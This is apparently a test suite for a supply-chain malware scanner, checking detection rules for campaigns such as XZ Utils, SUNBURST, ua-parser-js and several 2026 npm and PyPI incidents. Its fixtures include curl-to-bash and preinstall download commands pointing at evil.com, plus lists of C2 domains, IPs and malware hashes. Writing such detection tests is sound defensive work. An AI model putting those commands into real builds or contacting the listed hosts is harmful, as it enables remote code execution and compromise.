import { describe, it, expect, beforeEach, afterEach } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import { scan } from "../scanner.js";

describe("Campaign Signatures", () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join("/tmp", "scg-campaign-"));
  });

  afterEach(() => {
    fs.rmSync(tempDir, { recursive: true, force: true });
  });

  // =================================================================
  // XZ Utils Backdoor (CVE-2024-3094)
  // =================================================================

  describe("XZ Utils Backdoor (CVE-2024-3094)", () => {
    it("should detect _get_cpuid function reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "payload.c"),
        ""
      );
      // .c is not in SCANNABLE_EXTENSIONS, use .js
      fs.writeFileSync(
        path.join(tempDir, "hook.js"),
        'const fn = "_get_cpuid"; callHook(fn);'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "XZ_GET_CPUID");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect lzma_crc64 function reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "lzma.js"),
        "function lzma_crc64(buf) { return crc(buf); }"
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "XZ_LZMA_CRC64");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("high");
    });

    it("should detect build system injection in configure.ac patterns", async () => {
      fs.writeFileSync(
        path.join(tempDir, "build.sh"),
        'gl_cv_host_cpu_c_abi="x86_64" =configure.ac'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "XZ_BUILD_INJECT");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("high");
    });

    it("should detect obfuscated test file extraction patterns", async () => {
      fs.writeFileSync(
        path.join(tempDir, "extract.sh"),
        'xz -d tests/files/payload.xz | head -c 1024'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "XZ_OBFUSCATED_TEST"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("high");
    });

    it("should generate XZ Utils recommendation", async () => {
      fs.writeFileSync(
        path.join(tempDir, "xz.js"),
        'const sym = "_get_cpuid";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      expect(
        report.recommendations.some((r) => r.includes("CVE-2024-3094"))
      ).toBe(true);
    });
  });

  // =================================================================
  // Codecov Bash Uploader
  // =================================================================

  describe("Codecov Bash Uploader", () => {
    it("should detect curl piped to bash from codecov.io", async () => {
      fs.writeFileSync(
        path.join(tempDir, "ci.sh"),
        "curl -s https://codecov.io/bash | bash"
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "CODECOV_CURL_BASH"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("high");
    });

    it("should detect codecov with credential exfiltration pattern", async () => {
      fs.writeFileSync(
        path.join(tempDir, "upload.sh"),
        'codecov upload --token $ENV_SECRET_CREDENTIAL'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "CODECOV_EXFIL"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("high");
    });

    it("should generate Codecov recommendation", async () => {
      fs.writeFileSync(
        path.join(tempDir, "ci.sh"),
        "curl -s https://codecov.io/bash | bash"
      );

      const report = await scan({ target: tempDir, format: "text" });
      expect(
        report.recommendations.some((r) => r.includes("Codecov"))
      ).toBe(true);
    });
  });

  // =================================================================
  // SolarWinds SUNBURST
  // =================================================================

  describe("SolarWinds SUNBURST", () => {
    it("should detect avsvmcloud.com DGA domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "c2.js"),
        'const c2 = "update.avsvmcloud.com";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "SUNBURST_DGA");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect OrionImprovementBusinessLayer reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "backdoor.js"),
        "class OrionImprovementBusinessLayer { execute() {} }"
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "SUNBURST_ORION_CLASS"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect Thread.Sleep with long delay (>1hr)", async () => {
      fs.writeFileSync(
        path.join(tempDir, "evasion.js"),
        "Thread.Sleep(86400000);"
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "SUNBURST_DELAYED_EXEC"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("high");
    });

    it("should detect setTimeout with computed long delay", async () => {
      fs.writeFileSync(
        path.join(tempDir, "evasion2.js"),
        "setTimeout(callback, 24 * 86400);"
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "SUNBURST_DELAYED_EXEC"
      );
      expect(finding).toBeDefined();
    });

    it("should detect sleep with hour-based multiplier", async () => {
      fs.writeFileSync(
        path.join(tempDir, "evasion3.py"),
        "sleep(2 * 60 * 60)"
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "SUNBURST_DELAYED_EXEC"
      );
      expect(finding).toBeDefined();
    });

    it("should generate SUNBURST recommendation", async () => {
      fs.writeFileSync(
        path.join(tempDir, "sun.js"),
        'fetch("https://api.avsvmcloud.com/update");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      expect(
        report.recommendations.some((r) => r.includes("SUNBURST"))
      ).toBe(true);
    });
  });

  // =================================================================
  // ua-parser-js hijack
  // =================================================================

  describe("ua-parser-js hijack", () => {
    it("should detect crypto miner download pattern (jsextension)", async () => {
      fs.writeFileSync(
        path.join(tempDir, "miner.sh"),
        "curl https://evil.com/jsextension.exe -o /tmp/miner"
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "UAPARSER_MINER"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect preinstall downloading executables", async () => {
      const pkg = {
        name: "ua-parser-evil",
        version: "1.0.0",
        scripts: {
          preinstall: 'curl https://evil.com/payload.exe -o /tmp/run'
        },
      };
      // Write as .json for content scanning
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify(pkg, null, 2)
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "UAPARSER_PREINSTALL_DL"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should generate ua-parser-js recommendation", async () => {
      fs.writeFileSync(
        path.join(tempDir, "miner.sh"),
        "wget https://evil.com/jsextension -o /tmp/miner"
      );

      const report = await scan({ target: tempDir, format: "text" });
      expect(
        report.recommendations.some((r) => r.includes("ua-parser-js"))
      ).toBe(true);
    });
  });

  // =================================================================
  // coa/rc npm hijack
  // =================================================================

  describe("coa/rc npm hijack", () => {
    it("should detect sdd.dll reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "payload.js"),
        'const dll = path.join(tmpdir, "sdd.dll");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "COA_RC_SDD_DLL"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect postinstall with encoded payload execution", async () => {
      const pkg = {
        name: "coa-evil",
        version: "1.0.0",
        scripts: {
          postinstall: 'node compile.js'
        },
      };
      // The pattern looks for postinstall with compile.js in file content
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify(pkg, null, 2)
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "COA_RC_POSTINSTALL"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should generate coa/rc recommendation", async () => {
      fs.writeFileSync(
        path.join(tempDir, "trojan.js"),
        'fs.writeFileSync("sdd.dll", payload);'
      );

      const report = await scan({ target: tempDir, format: "text" });
      expect(
        report.recommendations.some((r) => r.includes("coa/rc"))
      ).toBe(true);
    });
  });

  // =================================================================
  // Checkmarx KICS / Bitwarden CLI supply-chain breach (April 2026)
  // =================================================================

  describe("Checkmarx KICS / Bitwarden CLI Breach (April 2026)", () => {
    it("should detect the Shai-Hulud Third Coming marker", async () => {
      fs.writeFileSync(
        path.join(tempDir, "exfil.js"),
        'const tag = "Shai-Hulud: The Third Coming";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "CHECKMARX_SHAI_HULUD_V3"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect the mcpAddon.js loader filename", async () => {
      fs.writeFileSync(
        path.join(tempDir, "loader.js"),
        'const dropper = require("./mcpAddon.js");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "CHECKMARX_MCP_ADDON"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect the bw_setup.js / bw1.js loader pair", async () => {
      fs.writeFileSync(
        path.join(tempDir, "preinstall.js"),
        'require("bw_setup.js"); require("bw1.js");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "BITWARDEN_CLI_LOADER"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect the audit.checkmarx.cx C2 domain via threat intel", async () => {
      fs.writeFileSync(
        path.join(tempDir, "beacon.js"),
        'fetch("https://audit.checkmarx.cx/v1/telemetry");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) =>
          f.description?.includes("audit.checkmarx.cx") ||
          f.description?.toLowerCase().includes("checkmarx")
      );
      expect(finding).toBeDefined();
    });
  });

  // =================================================================
  // DPRK @validate-sdk/v2 AI-inserted npm malware (April 2026)
  // =================================================================

  describe("DPRK @validate-sdk/v2 (April 2026)", () => {
    it("should detect references to @validate-sdk/v2 in code", async () => {
      fs.writeFileSync(
        path.join(tempDir, "deps.js"),
        'require("@validate-sdk/v2");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "DPRK_VALIDATE_SDK"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should flag @validate-sdk/v2 listed in a package.json", async () => {
      const pkg = {
        name: "victim-app",
        version: "1.0.0",
        dependencies: {
          "@validate-sdk/v2": "^1.0.0",
        },
      };
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify(pkg, null, 2)
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "DPRK_VALIDATE_SDK"
      );
      expect(finding).toBeDefined();
    });
  });

  // =================================================================
  // LofyGang / LofyStealer (April 2026)
  // =================================================================

  describe("LofyGang / LofyStealer (April 2026)", () => {
    it("should detect the LofyStealer marker", async () => {
      fs.writeFileSync(
        path.join(tempDir, "stealer.js"),
        'const family = "LofyStealer"; load(family);'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "LOFYSTEALER_MARKER"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect the GrabBot alias", async () => {
      fs.writeFileSync(
        path.join(tempDir, "alias.js"),
        'const tag = "GrabBot v1";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "LOFYSTEALER_MARKER"
      );
      expect(finding).toBeDefined();
    });

    it("should detect Minecraft hack lure combined with credential theft", async () => {
      fs.writeFileSync(
        path.join(tempDir, "lure.js"),
        'const tool = "minecraft hack loader that will steal session token";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "LOFYGANG_MINECRAFT_LURE"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("high");
    });
  });

  // =================================================================
  // Mini Shai-Hulud / TeamPCP (April 2026)
  // =================================================================

  describe("Mini Shai-Hulud / TeamPCP (April 2026)", () => {
    it("should detect the dead-drop repository description marker", async () => {
      fs.writeFileSync(
        path.join(tempDir, "exfil.js"),
        'const desc = "A Mini Shai-Hulud has Appeared"; createRepo(desc);'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "MINI_SHAI_HULUD_MARKER"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect the setup.mjs / execution.js loader filenames", async () => {
      fs.writeFileSync(
        path.join(tempDir, "loader.js"),
        'spawn("node", ["setup.mjs"]);'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "MINI_SHAI_HULUD_LOADER"
      );
      expect(finding).toBeDefined();
    });

    it("should detect a bun preinstall hook invoking setup.mjs", async () => {
      const pkg = {
        name: "victim-cap-pkg",
        version: "1.0.0",
        scripts: {
          preinstall: "bun setup.mjs",
        },
      };
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify(pkg, null, 2)
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "MINI_SHAI_HULUD_PREINSTALL"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // Integration: multiple campaign indicators in same project
  // =================================================================

  describe("Multi-campaign detection", () => {
    it("should detect multiple campaigns in the same directory", async () => {
      fs.writeFileSync(
        path.join(tempDir, "sunburst.js"),
        'const c2 = "avsvmcloud.com";\nclass OrionImprovementBusinessLayer {}'
      );
      fs.writeFileSync(
        path.join(tempDir, "xz.js"),
        'hook("_get_cpuid");'
      );
      fs.writeFileSync(
        path.join(tempDir, "coa.js"),
        'download("sdd.dll");'
      );

      const report = await scan({ target: tempDir, format: "text" });

      const rules = new Set(report.findings.map((f) => f.rule));
      expect(rules.has("SUNBURST_DGA")).toBe(true);
      expect(rules.has("SUNBURST_ORION_CLASS")).toBe(true);
      expect(rules.has("XZ_GET_CPUID")).toBe(true);
      expect(rules.has("COA_RC_SDD_DLL")).toBe(true);
      expect(report.riskLevel).toBe("critical");
    });
  });

  // =================================================================
  // CanisterSprawl npm Worm / TeamPCP Update 008 (April 2026)
  // =================================================================

  describe("CanisterSprawl npm Worm (TeamPCP Update 008)", () => {
    it("should detect CanisterSprawl ICP canister C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "payload.js"),
        'const c2 = "https://whereisitat.lucyatemysuperbox.space/beacon";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // BufferZoneCorp Sleeper Packages (Ruby gems + Go modules, May 2026)
  // =================================================================

  describe("BufferZoneCorp Sleeper Packages", () => {
    it("should flag BufferZoneCorp GitHub account reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "deps.go"),
        'package main\nimport _ "github.com/BufferZoneCorp/go-retryablehttp"'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // MacSync Stealer / Homebrew Malvertising (May 2026)
  // =================================================================

  describe("MacSync Stealer (Homebrew Malvertising)", () => {
    it("should detect glowmedaesthetics.com C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "loader.js"),
        'fetch("http://glowmedaesthetics.com/curl/payload");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect MacSync stealer SHA256 hash", async () => {
      fs.writeFileSync(
        path.join(tempDir, "manifest.js"),
        'const knownHash = "a4fcfecc5ac8fa57614b23928a0e9b7aa4f4a3b2b3a8c1772487b46277125571";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALWARE_HASH"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // EtherRAT GitHub Facades (April 2026)
  // =================================================================

  describe("EtherRAT GitHub Facades", () => {
    it("should detect EtherRAT fallback C2 IP", async () => {
      fs.writeFileSync(
        path.join(tempDir, "config.js"),
        'const fallback = "135.125.255.55";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_IP"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // DAEMON Tools QUIC RAT Supply Chain (May 2026)
  // =================================================================

  describe("DAEMON Tools QUIC RAT Supply Chain", () => {
    it("should detect env-check.daemontools.cc C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "stage1.js"),
        'const beacon = "https://env-check.daemontools.cc/probe";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // ZiChatBot PyPI Campaign (May 2026)
  // =================================================================

  describe("ZiChatBot PyPI Campaign", () => {
    it("should detect uuid32-utils package reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "deps.py"),
        'pkg = "uuid32-utils"; install(pkg)'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "ZICHATBOT_PACKAGE"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect colorinal package reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "setup.py"),
        'install_requires = ["colorinal>=1.0"]'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "ZICHATBOT_PACKAGE"
      );
      expect(finding).toBeDefined();
    });

    it("should detect termncolor package reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "deps.py"),
        'requirements = "termncolor==1.0.0"'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "ZICHATBOT_PACKAGE"
      );
      expect(finding).toBeDefined();
    });
  });

  // =================================================================
  // Beagle Backdoor / Fake Claude AI Site (May 2026)
  // =================================================================

  describe("Beagle Backdoor / Fake Claude AI Site", () => {
    it("should detect claude-pro.com C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "loader.js"),
        'const dl = "https://claude-pro.com/Claude-Pro-windows-x64.zip";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect license.claude-pro.com C2 subdomain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "beacon.js"),
        'const c2 = "license.claude-pro.com";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect 8.217.190.58 C2 IP", async () => {
      fs.writeFileSync(
        path.join(tempDir, "config.js"),
        'const host = "8.217.190.58";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_IP"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // TCLBANKER Brazilian Banking Trojan (May 2026)
  // =================================================================

  describe("TCLBANKER Logitech Trojanizer (REF3076)", () => {
    it("should detect mxtestacionamentos.com WebSocket C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "ws.js"),
        'const c2 = "wss://mxtestacionamentos.com/sock";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect campagna1-api workers.dev C2", async () => {
      fs.writeFileSync(
        path.join(tempDir, "beacon.js"),
        'fetch("https://campagna1-api.ef971a42.workers.dev/cmd");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect 191.96.224.96 historical C2 IP", async () => {
      fs.writeFileSync(
        path.join(tempDir, "host.js"),
        'const ip = "191.96.224.96";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_IP"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect TCLBANKER SHA256 component hash", async () => {
      fs.writeFileSync(
        path.join(tempDir, "hashlist.js"),
        'const h = "701d51b7be8b034c860bf97847bd59a87dca8481c4625328813746964995b626";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALWARE_HASH"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // JDownloader Site Compromise / Python RAT (May 2026)
  // =================================================================

  describe("JDownloader Site Compromise (May 2026)", () => {
    it("should detect parkspringshotel.com staging domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "stage.js"),
        'const u = "https://parkspringshotel.com/m/Lu6aeloo.php";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect auraguest.lk staging domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "fetch.js"),
        'fetch("https://auraguest.lk/m/douV2quu.php");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect checkinnhotels.com C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "c2.js"),
        'const c2 = "checkinnhotels.com";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // Fake OpenAI Privacy Filter / sefirah on Hugging Face (May 2026)
  // =================================================================

  describe("Fake OpenAI Privacy Filter (May 2026)", () => {
    it("should detect recargapopular.com sefirah C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "loader.js"),
        'const c2 = "https://recargapopular.com/upload";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });
});
